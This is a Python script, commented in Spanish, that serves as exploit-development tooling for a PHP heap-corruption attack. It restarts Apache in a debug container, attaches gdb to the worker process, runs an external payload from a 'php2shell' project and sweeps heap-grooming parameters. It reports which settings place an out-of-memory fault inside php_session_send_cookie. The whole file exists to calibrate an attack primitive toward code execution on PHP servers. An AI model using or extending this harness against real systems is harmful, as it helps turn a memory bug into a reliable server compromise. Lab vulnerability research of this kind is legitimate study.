#!/usr/bin/env python3
"""
oracle_bin128.py — mide el estado de heap en `php_session_reset_id` para calibrar
el primitivo A con `display_errors=Off`.

Contexto: `07-plan/progress-06.md`. El OOM cae dentro de
`php_session_send_cookie()` (y no después, en `zend_arena_create`) solo si al entrar
en `php_session_reset_id` se cumple:

    free_pages == 0  y  free_slot[11] == NULL  y  ps_globals.send_cookie == 1

El estado se mide en el worker que atiende la petición, con breakpoints reales, no
en el proceso maestro ni después de terminar el request.

Requisitos:

  - Contenedor con build instrumentado (`phpdebug:8.4.26-g`), gdb instalado,
    `--cap-add SYS_PTRACE --security-opt seccomp=unconfined`.
  - El contenedor no debe tener Apache como PID 1: se reinicia Apache por trial.
    Usar entrypoint `sleep infinity` y arrancar Apache con `apache2ctl start`.
  - Payload A externo (no versionado): el `send_a_oom5.py` de
    github.com/9bie/php2shell, con el puerto apuntando al del contenedor.

Uso:

    python3 oracle_bin128.py \\
        --container lab-vuln \\
        --payload ./9bie/send_a_oom5.py \\
        --nb 230,232,234,235 --k 2,3,4

Cada trial reinicia Apache, adjunta gdb al worker, envía A y clasifica:

    HIT   free_pages=0, fs11=0x0, sc=1
    MISS  cualquier otro estado (se imprime el motivo)
"""

import argparse
import os
import re
import subprocess
import sys
import time

STATE_RE = re.compile(
    r"ORACLE_STATE free_pages=(\d+) chunks=(\d+) fs11=(0x[0-9a-f]+|0x0) "
    r"sc=(\d+) len=(-?\d+) size=(\d+) real=(\d+)")
OOM_RE = re.compile(r"ORACLE_OOM sc=(\d+) len=(-?\d+)")

GDB_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "oracle_bin128.gdb")


def docker(container, cmd, timeout=30):
    return subprocess.run(
        ["docker", "exec", container, "sh", "-c", cmd],
        capture_output=True, text=True, timeout=timeout)


def check_environment(container):
    run = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True, text=True)
    if run.returncode != 0 or run.stdout.strip() != "true":
        raise SystemExit("el contenedor %s no esta corriendo" % container)

    pid1 = docker(container, "cat /proc/1/comm").stdout.strip()
    if pid1 == "apache2":
        raise SystemExit(
            "Apache es PID 1 en %s: reiniciarlo mata el contenedor. Usar entrypoint "
            "'sleep infinity' y arrancar Apache con apache2ctl start." % container)

    if not docker(container, "command -v gdb").stdout.strip():
        raise SystemExit("gdb no esta instalado en %s" % container)

    symbols = docker(
        container,
        "nm /usr/lib/apache2/modules/libphp.so 2>/dev/null | grep -c ' php_session_reset_id$'").stdout.strip()
    if symbols in ("", "0"):
        raise SystemExit(
            "libphp.so no expone php_session_reset_id: build sin simbolos. "
            "Se necesita un build -g3 (phpdebug:8.4.26-g).")


def restart_apache(container):
    docker(container,
           "pkill -9 gdb 2>/dev/null; apache2ctl -k stop 2>/dev/null; sleep 0.3; "
           "pkill -9 apache2 2>/dev/null; sleep 0.3; "
           "rm -f /tmp/sess_* /tmp/oracle_g.log /tmp/oracle_gdb_err.log; "
           "apache2ctl start")


def worker_pid(container):
    master = docker(container, "pgrep -o -x apache2").stdout.split()
    if not master:
        return None
    workers = docker(
        container, "pgrep -P %s -x apache2 | tail -1" % master[0]).stdout.split()
    return workers[-1] if workers else None


def attach_gdb(container, pid, wait_s):
    subprocess.run(
        ["docker", "cp", GDB_SCRIPT, "%s:/tmp/oracle_bin128.gdb" % container],
        check=True, capture_output=True)
    subprocess.run(
        ["docker", "exec", "-d", container, "sh", "-c",
         "gdb -p %s -batch -x /tmp/oracle_bin128.gdb >/tmp/oracle_gdb_err.log 2>&1" % pid],
        check=True, capture_output=True)

    deadline = time.time() + wait_s
    while time.time() < deadline:
        log = docker(container, "cat /tmp/oracle_gdb_err.log 2>/dev/null").stdout
        if "Breakpoint 1 at" in log:
            return True
        time.sleep(0.3)
    return False


def parse_state(log):
    states = []
    for match in STATE_RE.finditer(log):
        free_pages, chunks, fs11, sc, length, size, real = match.groups()
        states.append({
            "free_pages": int(free_pages),
            "chunks": int(chunks),
            "fs11": fs11,
            "sc": int(sc),
            "len": int(length),
            "size": int(size),
            "real": int(real),
        })
    ooms = [{"sc": int(m.group(1)), "len": int(m.group(2))}
            for m in OOM_RE.finditer(log)]
    return states, ooms


def classify(states, ooms):
    if not states:
        return False, "sin ORACLE_STATE: gdb no llego a php_session_reset_id"
    state = states[0]
    if state["chunks"] <= 1 or state["real"] < 8 * 1024 * 1024:
        return False, "primer estado es de un worker nuevo (chunks=%d real=%d)" % (
            state["chunks"], state["real"])
    if state["free_pages"] != 0:
        return False, "free_pages=%d" % state["free_pages"]
    if state["fs11"] != "0x0":
        return False, "fs11=%s (slot bin-128 libre)" % state["fs11"]
    if state["sc"] != 1:
        return False, "send_cookie=%d" % state["sc"]
    if not any(o["sc"] == 1 for o in ooms):
        return False, "sin OOM con send_cookie=1"
    return True, "free_pages=0, fs11=0x0, OOM con sc=1"


def run_trial(container, payload, params, wait_s):
    restart_apache(container)
    pid = worker_pid(container)
    if not pid:
        return False, "sin worker de Apache"
    if not attach_gdb(container, pid, wait_s):
        return False, "gdb no resolvio breakpoints en %ss" % wait_s

    args = [sys.executable, payload] + [str(x) for x in params]
    try:
        subprocess.run(args, capture_output=True, timeout=90)
    except subprocess.TimeoutExpired:
        return False, "payload timeout"

    time.sleep(0.5)
    log = docker(container, "cat /tmp/oracle_g.log 2>/dev/null").stdout
    docker(container, "pkill -9 gdb 2>/dev/null")
    states, ooms = parse_state(log)
    ok, reason = classify(states, ooms)
    if states:
        s = states[0]
        detail = "free_pages=%d fs11=%s sc=%d" % (s["free_pages"], s["fs11"], s["sc"])
    else:
        detail = "-"
    return ok, "%s | %s" % (detail, reason)


def main():
    ap = argparse.ArgumentParser(description="Calibra free_slot[11] y free_pages con gdb")
    ap.add_argument("--container", required=True)
    ap.add_argument("--payload", required=True,
                    help="send_a_oom5.py de 9bie configurado para el puerto del contenedor")
    ap.add_argument("--nb", default="234,235", help="lista de NB separada por comas")
    ap.add_argument("--k", default="3,4", help="lista de K separada por comas")
    ap.add_argument("--s", type=int, default=63, help="campos S (bin-128)")
    ap.add_argument("--x", type=int, default=208, help="trimmers bin-256")
    ap.add_argument("--bl", type=int, default=15000, help="tamano de los campos grandes")
    ap.add_argument("--kl", type=int, default=4000, help="tamano de los campos de cola")
    ap.add_argument("--fl", type=int, default=103, help="longitud del nombre del file part")
    ap.add_argument("--wait", type=float, default=10.0, help="segundos de espera a gdb")
    args = ap.parse_args()

    if not os.path.exists(args.payload):
        raise SystemExit("no existe el payload: %s" % args.payload)

    check_environment(args.container)

    nb_list = [int(x) for x in args.nb.split(",") if x]
    k_list = [int(x) for x in args.k.split(",") if x]

    print("oraculo bin-128 | container=%s payload=%s" % (args.container, args.payload))
    print("%6s %4s  %s" % ("NB", "K", "estado"))
    hits = []
    for nb in nb_list:
        for k in k_list:
            params = [0, args.s, nb, args.bl, args.x, k, args.kl, args.fl]
            ok, detail = run_trial(args.container, args.payload, params, args.wait)
            print("%6d %4d  %-8s %s" % (nb, k, "HIT" if ok else "miss", detail))
            if ok:
                hits.append((nb, k))

    print()
    if hits:
        print("configuraciones HIT: %s" % ", ".join("NB=%d K=%d" % h for h in hits))
        return 0
    print("sin HIT en el barrido. Ajustar S (paridad de bin-128), NB o K.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
